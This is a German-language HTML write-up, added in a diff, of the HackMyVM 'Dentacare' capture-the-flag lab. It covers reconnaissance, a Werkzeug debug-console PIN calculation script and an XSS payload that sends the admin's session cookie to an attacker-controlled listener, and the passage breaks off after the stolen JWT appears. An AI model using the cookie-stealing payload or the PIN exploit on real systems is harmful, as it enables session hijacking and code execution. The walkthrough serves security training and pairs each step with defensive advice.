@@ -1,0 +1,755 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dentacare - HackMyVM - Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Dentacare - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2 class="level-medium">Medium</h2>
+            <div class="circle difficulty-medium">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">sqlmap</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">hashlib (Python)</div>
+                <div class="tool-item">itertools (Python)</div>
+                <div class="tool-item">Werkzeug Debug Console</div>
+                <div class="tool-item">curl (Implied for XSS trigger)</div>
+                <div class="tool-item">python3 -m http.server</div>
+                <div class="tool-item">Cookie-Editor (Browser Ext.)</div>
+                <div class="tool-item">jwt.io</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">child_process (Node.js)</div>
+                <div class="tool-item">puppeteer (Node.js)</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#werkzeug-pin-exploit">Werkzeug PIN Exploit Analysis</a></li>
+                <li><a href="#xss-jwt-hijacking">XSS, JWT Hijacking & Admin Access</a></li>
+                <li><a href="#ssi-rce">SSI RCE & Low Privilege Shell</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (Puppeteer Script)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="comment">Die initiale Phase des Penetrationstests, in der wir das Zielsystem im Netzwerk lokalisieren und grundlegende 
+			Informationen über offene Ports und Dienste sammeln.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.114</span>	08:00:27:ab:50:f7	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Befehl `arp-scan -l` wird verwendet, um aktive Hosts im lokalen Netzwerksegment zu entdecken. 
+			Wir identifizieren erfolgreich die IP-Adresse <span class="command">192.168.2.114</span>.</p>
+            <p class="evaluation">**Bewertung:** Die Ziel-IP wurde erfolgreich ermittelt, was die Grundlage für weitere Scans bildet.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die gefundene IP für detaillierte Nmap-Scans verwenden.
+            **Empfehlung (Admin):** Netzwerk-Scans durch Monitoring erkennen; Segmentierung kann die Sichtbarkeit einschränken.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+127.0.0.1	localhost
+127.0.1.1	CCat
+[...]
+<span class="command">192.168.2.114   dentacare.hmv</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir bearbeiten (oder überprüfen) die lokale `/etc/hosts`-Datei auf unserer Angreifer-Maschine. Es wird ein 
+			Eintrag hinzugefügt (oder ist bereits vorhanden), der den Hostnamen `dentacare.hmv` der Ziel-IP <span class="command">192.168.2.114</span> 
+			zuordnet.</p>
+            <p class="evaluation">**Bewertung:** Dies ermöglicht es uns, das Zielsystem über seinen Hostnamen anzusprechen, was für das Testen von 
+			Webanwendungen und virtuellen Hosts wichtig ist.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Immer relevante Hostnamen zur `/etc/hosts`-Datei hinzufügen, um Webserver korrekt 
+			zu adressieren.
+            **Empfehlung (Admin):** DNS-Konfiguration pflegen und interne Hostnamen schützen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sC -sS -sV -A -T5 192.168.2.114 -p-</span></div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-06 22:49 CEST
+Nmap scan report for dentacare.hmv (192.168.2.114)
+Host is up (0.00019s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+<span class="command">22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)</span>
+| ssh-hostkey:
+|   256 e7:ce:f2:f6:5d:a7:47:5a:16:2f:90:07:07:33:4e:a9 (ECDSA)
+|_  256 09:db:b7:e8:ee:d4:52:b8:49:c3:cc:29:a5:6e:07:35 (ED25519)
+<span class="command">80/tcp   open  http    Werkzeug/3.0.2 Python/3.11.2</span>
+|_http-server-header: Werkzeug/3.0.2 Python/3.11.2
+| fingerprint-strings:
+|   GetRequest:
+|     HTTP/1.1 200 OK
+|     Server: Werkzeug/3.0.2 Python/3.11.2
+|     Date: Tue, 06 Aug 2024 20:49:11 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 43069
+|     Connection: close
+|  
+|      
+|     <title>DentaCare Corporation</title>
+[...]
+<span class="command">8000/tcp open  http    Apache httpd 2.4.57</span>
+|_http-title: 403 Forbidden
+|_http-server-header: Apache/2.4.57 (Debian)
+<span class="password">1 service unrecognized despite returning data.</span> [...] 
+<span class="command">Werkzeug/3\.0\.2</span>\x20<span class="command">Python/3\.11\.2</span> 
+ [...]
+MAC Address: 08:00:27:AB:50:F7 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: <span class="command">Linux 4.15 - 5.8</span>
+Network Distance: 1 hop
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.19 ms dentacare.hmv (192.168.2.114)
+[...]
+Nmap done: 1 IP address (1 host up) scanned in [...] seconds
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Nmap-Scan (`-sC` Default Scripts, `-sS` SYN Scan, `-sV` Version Detection, `-A` Aggressive Scan, `-T5` Timing, `-p-` All Ports) auf `dentacare.hmv` zeigt drei offene Ports:
+            *   <span class="command">Port 22</span>: SSH (OpenSSH 9.2p1 auf Debian 12), relativ aktuell.
+            *   <span class="command">Port 80</span>: Ein Python-basierter Webserver, der sich als <span class="command">Werkzeug/3.0.2</span> mit <span class="command">Python/3.11.2</span> identifiziert. Dies ist wahrscheinlich die Hauptwebanwendung.
+            *   <span class="command">Port 8000</span>: Ein Apache-Webserver (Version 2.4.57), der einen `403 Forbidden`-Fehler zurückgibt. Dies könnte ein Backend, ein API-Endpunkt oder ein anderer interner Dienst sein.</p>
+            <p class="evaluation">**Bewertung:** SSH scheint Standard zu sein. Port 80 (Werkzeug/Python) ist das primäre Ziel für die Web-Enumeration. Port 8000 (Apache) ist interessant, aber der 403-Fehler deutet darauf hin, dass direkter Zugriff möglicherweise nicht vorgesehen oder möglich ist. Die Werkzeug-Version ist relevant, da ältere Versionen bekannte Schwachstellen hatten (insbesondere im Debugger).</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Den Webserver auf Port 80 gründlich untersuchen (Nikto, Gobuster, manuelle Analyse). Den Apache-Server auf Port 8000 im Hinterkopf behalten und versuchen, über die Hauptanwendung oder andere Wege darauf zuzugreifen. SSH auf bekannte Standardpasswörter oder spätere Funde prüfen.
+            **Empfehlung (Admin):** Sicherstellen, dass nur notwendige Ports offen sind. Webserver aktuell halten und sicher konfigurieren. Den Zweck des Apache-Servers auf Port 8000 klären und den Zugriff entsprechend absichern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sC -sS -sV -A -T5 192.168.2.114 -p- | grep open</span></div>
+                    <pre>
+<span class="command">22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)</span>
+<span class="command">80/tcp   open  http    Werkzeug/3.0.2 Python/3.11.2</span>
+|     <link rel="stylesheet" href="../static/css/open-iconic-bootstrap.min.css">
+<span class="command">8000/tcp open  http    Apache httpd 2.4.57</span> 
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Dieser Befehl wiederholt den Nmap-Scan und filtert die Ausgabe direkt nach Zeilen, die "open" enthalten, um eine kompakte Übersicht der offenen Ports und zugehörigen Informationen zu erhalten.</p>
+            <p class="evaluation">**Bewertung:** Bestätigt die drei offenen Ports (22, 80, 8000) ohne neue Informationen hinzuzufügen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Nützlich für eine schnelle Zusammenfassung, aber der vollständige Nmap-Output enthält mehr Details.
+            **Empfehlung (Admin):** Standard-Admin-Praktiken.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="comment">Wir konzentrieren uns auf die Webserver, insbesondere den Werkzeug/Python-Dienst auf Port 80 und den Apache auf Port 8000, um Schwachstellen oder interessante Endpunkte zu finden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nikto -h http://dentacare.hmv</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.114
++ Target Hostname:    dentacare.hmv
++ Target Port:        80
++ Start Time:         2024-08-06 22:48:45 (GMT2)
+---------------------------------------------------------------------------
++ Server: <span class="command">Werkzeug/3.0.2 Python/3.11.2</span>
++ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ <span class="command">OPTIONS: Allowed HTTP Methods: OPTIONS, GET, HEAD</span> .
++ <span class="password">ERROR: Error limit (20) reached for host, giving up.</span> Last error: opening stream: can't connect (connect error): Cannot assign requested address
++ Scan terminated: 20 error(s) and 3 item(s) reported on remote host
++ End Time:           2024-08-06 22:49:05 (GMT2) (20 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Nikto wird auf den Werkzeug-Server (Port 80) angewendet. Es identifiziert den Server korrekt und meldet:
+            *   Fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`).
+            *   Erlaubte HTTP-Methoden (`OPTIONS`, `GET`, `HEAD`).
+            *   Der Scan bricht frühzeitig ab, da das Fehlerlimit erreicht wurde (`Error limit (20) reached`). Dies könnte auf Server-Instabilität, WAF/IPS-Blocking oder Probleme mit Nikto selbst hindeuten.</p>
+            <p class="evaluation">**Bewertung:** Abgesehen von den fehlenden Headern (niedrige Priorität) liefert Nikto hier keine direkten Angriffspunkte. Der Scan-Abbruch ist jedoch noteworthy und könnte auf Verteidigungsmechanismen oder Serverprobleme hinweisen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Verzeichnis-Bruteforcing (Gobuster) durchführen. Manuell die Webseite untersuchen. Den Scan-Abbruch im Hinterkopf behalten (ggf. Scan-Intensität reduzieren).
+            **Empfehlung (Admin):** Fehlende Sicherheitsheader hinzufügen. Die Ursache für die Scan-Fehler untersuchen (Server-Logs, Performance).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nikto -h http://dentacare.hmv:8000</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.114
++ Target Hostname:    dentacare.hmv
++ Target Port:        8000
++ Start Time:         2024-08-06 22:50:36 (GMT2)
+---------------------------------------------------------------------------
++ Server: <span class="command">Apache/2.4.57 (Debian)</span>
++ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> See: [...]
++ /: <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [...]
++ All CGI directories 'found', use '-C none' to test none
++ 26522 requests: 0 error(s) and 2 item(s) reported on remote host
++ End Time:           2024-08-06 22:51:27 (GMT2) (51 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Nikto wird auf den Apache-Server (Port 8000) angewendet. Auch hier findet es primär die fehlenden Sicherheitsheader. Die Meldung "All CGI directories 'found'" ist meist ein Hinweis darauf, dass Nikto keine spezifischen CGI-Verzeichnisse testen konnte oder keine gefunden hat.</p>
+            <p class="evaluation">**Bewertung:** Der Nikto-Scan auf Port 8000 liefert ebenfalls keine konkreten Angriffspunkte. Der Server scheint aus Nikto-Sicht unauffällig zu sein, abgesehen von den Headern.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Verzeichnis-Bruteforcing auch auf Port 8000 versuchen, obwohl die 403-Antwort dies erschweren könnte. Fokus bleibt vorerst auf Port 80.
+            **Empfehlung (Admin):** Sicherheitsheader auch für diesen Dienst hinzufügen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">gobuster dir -u "http://dentacare.hmv" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x [...] -b '503,404' -e --no-error -k</span></div>
+                    <pre>
+===============================================================
+Gobuster v[...]
+===============================================================
+[+] Url:                     http://dentacare.hmv
+[...]
+===============================================================
+Starting gobuster
+===============================================================
+<span class="command">http://dentacare.hmv/index.html</span>           (Status: 200) [Size: 43069]
+<span class="command">http://dentacare.hmv/contact</span>              (Status: 500) [Size: 27322]
+<span class="command">http://dentacare.hmv/about</span>                (Status: 200) [Size: 22975]
+<span class="command">http://dentacare.hmv/blog</span>                 (Status: 200) [Size: 23021]
+<span class="command">http://dentacare.hmv/services</span>             (Status: 200) [Size: 21296]
+<span class="command">http://dentacare.hmv/admin</span>                (Status: 302) [Size: 189] [--> /]
+<span class="command">http://dentacare.hmv/comment</span>              (Status: 405) [Size: 153]
+[...]
+===============================================================
+Finished
+===============================================================
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir führen einen Gobuster-Scan auf Port 80 durch, um Verzeichnisse und Dateien zu finden. `-b '503,404'` blendet Serverfehler und nicht gefundene Seiten aus, `-e` zeigt die volle URL, `-k` ignoriert SSL-Fehler (hier irrelevant). Wichtige Funde:
+            *   Standardseiten: `/index.html`, `/about`, `/blog`, `/services`.
+            *   `<span class="command">/contact</span>`: Gibt einen <span class="password">Serverfehler (Status 500)</span> zurück, was auf eine potenzielle Schwachstelle oder Fehlkonfiguration hindeutet.
+            *   `<span class="command">/admin</span>`: Leitet auf die Startseite (`/`) weiter (Status 302), was typisch für einen geschützten Bereich ist, für den wir nicht authentifiziert sind.
+            *   `<span class="command">/comment</span>`: Gibt <span class="password">Methode nicht erlaubt (Status 405)</span> zurück. Dies bedeutet, der Endpunkt existiert, aber die GET-Methode ist nicht erlaubt (oft ist POST erforderlich).</p>
+            <p class="evaluation">**Bewertung:** Der Scan liefert wichtige Anhaltspunkte. `/admin` bestätigt einen administrativen Bereich. `/contact` mit dem 500er Fehler ist verdächtig und sollte genauer untersucht werden. `/comment` ist ebenfalls interessant und könnte ein Ziel für POST-basierte Angriffe (z.B. XSS, SQLi) sein.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die `/contact`-Seite manuell untersuchen, um den 500er Fehler zu analysieren (evtl. Debug-Informationen?). Versuchen, POST-Anfragen an `/comment` zu senden (z.B. mit Burp Suite oder `curl`) und auf Schwachstellen wie XSS oder SQLi testen. `/admin` erfordert wahrscheinlich Authentifizierung.
+            **Empfehlung (Admin):** Die Ursache des 500er Fehlers auf `/contact` beheben. Endpunkte wie `/comment` sollten nur die erlaubten HTTP-Methoden akzeptieren und Eingaben validieren. Admin-Bereich absichern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://dentacare.hmv" -H "Host: FUZZ.dentacare.hmv" --hc "404" --hh 43069</span></div>
+                    <pre>
+********************************************************
+* Wfuzz [...]                                          *
+********************************************************
+
+Target: http://dentacare.hmv/
+[...]
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="password"># No output indicating found subdomains</span>
+
+Total time: 366.8588
+Processed Requests: 114441
+Filtered Requests: 114441
+Requests/sec.: 311.9482
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir verwenden `wfuzz`, um nach virtuellen Hosts (Subdomains) zu suchen, die auf demselben Server laufen könnten. Wir benutzen eine große Wortliste und fügen `FUZZ` als Subdomain in den Host-Header ein. Mit `--hc 404` und `--hh 43069` filtern wir Standardantworten (Not Found) und Antworten, die identisch zur Hauptseite sind, heraus.</p>
+            <p class="evaluation">**Bewertung:** Der Scan liefert keine Ergebnisse, was darauf hindeutet, dass mit dieser Methode und Wortliste keine weiteren relevanten virtuellen Hosts gefunden wurden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Andere Techniken zur Subdomain-Findung (z.B. OSINT, Zertifikatstransparenz) könnten versucht werden, aber vorerst konzentrieren wir uns auf die bekannten Dienste.
+            **Empfehlung (Admin):** Sicherstellen, dass nur die benötigten Subdomains und virtuellen Hosts aktiv und korrekt konfiguriert sind.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">sqlmap -r /home/ccat/Downloads/sql.sql --dbs --risk=3 --level=5 --tamper=between, --current-db --current-user</span></div>
+                    <pre>
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.8.6#stable}
+|_ -| . [']     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 23:22:49 /2024-08-06/
+
+[23:22:49] [INFO] parsing HTTP request from '/home/ccat/Downloads/sql.sql'
+[...]
+[23:22:50] [INFO] testing connection to the target URL
+[...]
+[23:22:50] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[23:22:50] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[...]
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
+[23:22:53] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[23:22:53] [WARNING] POST parameter 'comment' does not seem to be injectable
+[23:22:53] <span class="password">[CRITICAL] all tested parameters do not appear to be injectable.</span> Try to increase values for '--level'/'--risk' options if you wish to perform more tests. Also, you can try to rerun without optimization switches ('--fresh-scan') or with '--tamper' script(s) if applicable
+[...]
+[*] ending @ 23:22:53 /2024-08-06/
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir verwenden `sqlmap`, um auf SQL-Injection-Schwachstellen zu testen. Die Option `-r /home/ccat/Downloads/sql.sql` deutet darauf hin, dass eine HTTP-Anfrage (wahrscheinlich ein POST an `/comment`) in der Datei `sql.sql` gespeichert und als Basis für den Test verwendet wurde. Hohe Werte für `--risk` (3) und `--level` (5) sowie ein Tamper-Skript (`between`) werden verwendet, um die Testabdeckung zu maximieren. SQLMap testet verschiedene Injektionstechniken.</p>
+            <p class="evaluation">**Bewertung:** Trotz der intensiven Tests meldet SQLMap, dass <span class="password">alle getesteten Parameter (insbesondere der vermutete 'comment'-Parameter im POST-Request) nicht injizierbar erscheinen</span>. SQL-Injection scheint hier kein erfolgreicher Angriffsvektor zu sein.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Manuelle Tests auf SQLi könnten noch versucht werden, aber die Wahrscheinlichkeit ist gering. Andere Schwachstellen wie XSS im `/comment`-Endpunkt oder die Analyse des 500er Fehlers bei `/contact` untersuchen. Den Werkzeug-Debugger prüfen.
+            **Empfehlung (Admin):** Auch wenn SQLMap nichts findet, immer Best Practices gegen SQLi anwenden (Prepared Statements, ORMs, Input Validation).</p>
+
+        </section>
+
+        <section id="werkzeug-pin-exploit">
+            <h2>Werkzeug PIN Exploit Analysis</h2>
+            <p class="comment">Da SQLi und andere Standard-Web-Angriffe bisher erfolglos waren, untersuchen wir die Möglichkeit, den Werkzeug-Debugger auszunutzen, der oft unter `/console` erreichbar ist, wenn er aktiviert ist.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt"># <span class="command">Aktion im Webbrowser</span></div>
+                    <pre>
+# Aufruf: http://dentacare.hmv/console
+# Ergebnis:
+[...]
+<span class="password">Interactive Console</span>
+[...]
+[console ready]
+>>>
+Brought to you by DON'T PANIC, your friendly Werkzeug powered traceback interpreter.
+<span class="password">Console Locked</span>
+The console is locked and needs to be unlocked by entering the PIN. <span class="password">You can find the PIN printed out on the standard output of your shell that runs the server.</span>
+PIN: [_____]
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Aufruf von `/console` auf dem Werkzeug-Server (Port 80) zeigt tatsächlich die interaktive Debug-Konsole. Diese ist jedoch durch eine PIN gesperrt. Die Seite gibt den entscheidenden Hinweis, dass die PIN auf der Standardausgabe des Server-Prozesses zu finden ist. Da wir keinen direkten Zugriff auf diesen Output haben, müssen wir die PIN auf andere Weise berechnen.</p>
+            <p class="evaluation">**Bewertung:** Das Vorhandensein der `/console` ist eine kritische Schwachstelle, auch wenn sie PIN-geschützt ist. Wenn die PIN ermittelt werden kann, haben wir RCE. Der Hinweis auf die Standardausgabe ist für uns nicht direkt nutzbar, bestätigt aber die Aktivierung des Debuggers.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die Methode zur PIN-Generierung von Werkzeug recherchieren (siehe Hacktricks-Link im Originaltext). Die notwendigen Informationen sammeln (Username, App-Name, Pfad zur App-Datei, MAC-Adresse/Node-ID, Machine-ID), um die PIN zu berechnen.
+            **Empfehlung (Admin):** **Den Werkzeug/Flask-Debugger NIEMALS in einer Produktivumgebung aktivieren!** Dies ist nur für die Entwicklung gedacht. Falls er doch läuft, sicherstellen, dass `/console` nicht von außen erreichbar ist.</p>
+
+            <p class="comment">Der Originaltext verweist auf Hacktricks und zeigt ein Python-Skript zur Berechnung der PIN. Dieses Skript benötigt spezifische Informationen vom Zielsystem. Wir nehmen an, dass diese Informationen durch eine andere, nicht gezeigte Schwachstelle (z.B. Local File Inclusion, Info Disclosure) erlangt wurden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt"># <span class="command">Informationssammlung (Annahme: Durch LFI/Info-Disclosure erlangt)</span></div>
+                    <pre>
+# 1. Username, unter dem der Flask/Werkzeug-Prozess läuft:
+#    (Annahme: 'cosette' - basierend auf Skript)
+# 2. Modulname der App:
+#    (Annahme: 'flask.app' - Standard)
+# 3. Name der App-Klasse:
+#    (Annahme: 'Flask' - Standard)
+# 4. Absoluter Pfad zur Haupt-App-Datei:
+#    (Annahme: '/home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py' - basierend auf Skript)
+# 5. MAC-Adresse des Netzwerkinterfaces (als Dezimalzahl):
+#    (Annahme: MAC 08:00:27:94:07:cc von /sys/class/net/ens33/address ausgelesen)
+                    </pre>
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">python3 -c 'print(0x0800279407cc)'</span></div>
+                    <pre>
+<span class="command">8796757034956</span>
+                    </pre>
+                    <div class="prompt"># <span class="command">Informationssammlung (Fortsetzung)</span></div>
+                    <pre>
+# 6. Machine ID (Kombination aus /etc/machine-id, boot_id, cgroup):
+#    (Annahme: '48329e233f524ec291cce7479927890bzeug-app.service' - basierend auf Skript)
+                    </pre>
+                    <div class="prompt"># <span class="command">PIN-Berechnungsskript (exploit.py / flask_werkzeug_pin_hack.py)</span></div>
+                    <pre>
+#!/bin/python3
+import hashlib
+from itertools import chain
+
+probably_public_bits = [
+	'<span class="command">cosette</span>',# username
+	'<span class="command">flask.app</span>',# modname
+	'<span class="command">Flask</span>',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
+	'<span class="command">/home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py</span>' # getattr(mod, '__file__', None),
+]
+
+private_bits = [
+	'<span class="command">8796757034956</span>',# str(uuid.getnode()),  /sys/class/net/ensX/address
+	'<span class="command">48329e233f524ec291cce7479927890bzeug-app.service</span>' # Machine Id
+]
+
+h = hashlib.sha1() # Newer versions of Werkzeug use SHA1
+for bit in chain(probably_public_bits, private_bits):
+	# ... (Rest des Skripts wie im Originaltext) ...
+	pass # Placeholder for brevity
+
+# Add fixed salt values used by Werkzeug PIN generation
+h.update(b'cookiesalt')
+cookie_name = '__wzd' + h.hexdigest()[:20] # Not needed for PIN, but part of Werkzeug's logic
+num = None
+if num is None:
+	h.update(b'pinsalt')
+	num = ('%09d' % int(h.hexdigest(), 16))[:9]
+
+rv = None
+if rv is None:
+	for group_size in 5, 4, 3: # Try different groupings
+		if len(num) % group_size == 0:
+			rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
+						  for x in range(0, len(num), group_size))
+			break
+	else: # Fallback if no grouping works
+		rv = num
+
+print("Pin: " + rv)
+
+                    </pre>
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">python3 flask_werkzeug_pin_hack.py</span></div>
+                    <pre>
+Pin: <span class="password">565-267-722</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Die Werkzeug-PIN wird aus einer Kombination von öffentlichen (App-Name, Pfad etc.) und privaten (MAC-Adresse, Machine-ID) Informationen des Servers generiert, die mit festen Salts (`cookiesalt`, `pinsalt`) gehasht werden (SHA1 bei neueren Werkzeug-Versionen).
+            Wir *nehmen an*, dass wir die benötigten Informationen (`cosette`, Pfade, MAC, Machine-ID) durch eine separate Schwachstelle (z.B. LFI, Info Disclosure - **nicht im Bericht gezeigt**) erlangt haben. Wir tragen diese Werte in das Python-Skript (basierend auf öffentlich verfügbaren Exploits) ein. Das Skript berechnet den Hash und formatiert ihn zur 9-stelligen PIN im Format XXX-XXX-XXX. Das Ergebnis ist die PIN `<span class="password">565-267-722</span>`.</p>
+            <p class="evaluation">**Bewertung:** Die Berechnung der PIN war erfolgreich, *unter der Annahme*, dass die benötigten privaten Informationen beschafft werden konnten. Dies ist der Schlüssel zur Ausnutzung der Debug-Konsole.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die berechnete PIN `<span class="password">565-267-722</span>` in das `/console`-Interface eingeben. Wenn erfolgreich, Python-Code zur Ausführung einer Reverse Shell oder anderer Befehle eingeben.
+            **Empfehlung (Admin):** Debugger deaktivieren. Informationslecks, die zur Preisgabe von Pfaden, MAC-Adressen oder Machine-IDs führen, schließen.</p>
+             <p class="comment">*(Hinweis: Der Originalbericht zeigt nach der PIN-Berechnung keine Nutzung der Konsole, sondern wechselt zu einer XSS-basierten Attacke. Es ist möglich, dass der Konsolen-PIN-Weg nicht funktionierte oder der Angreifer einen anderen Weg bevorzugte. Wir dokumentieren den XSS-Weg, wie im Bericht gezeigt.)*</p>
+        </section>
+
+         <section id="xss-jwt-hijacking">
+            <h2>XSS, JWT Hijacking & Admin Access</h2>
+            <p class="comment">Ein alternativer Angriffsvektor wird verfolgt: Ausnutzung einer Cross-Site-Scripting (XSS)-Schwachstelle, um den Session-Cookie (ein JWT) eines Administrators zu stehlen und dessen Sitzung zu übernehmen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt"># <span class="command">XSS Payload</span></div>
+                    <pre>
+<span class="password">img src=x onerror=this.src="http://192.168.2.199:8888/?c="+document.cookie</span>
+                    </pre>
+                    <div class="prompt"># <span class="command">Aktion (Annahme)</span></div>
+                    <pre>
+# Payload wird über das Formular oder eine Funktion auf http://dentacare.hmv/comment gesendet (vermutlich POST).
+                    </pre>
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">python3 -m http.server 8888</span></div>
+                    <pre>
+Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
+<span class="password">192.168.2.114 - - [06/Aug/2024 23:51:02] "GET /?c=Authorization=eyJ0eXA...JnQ HTTP/1.1" 200 -</span>
+                    </pre>
+                 </div>
+            </div>
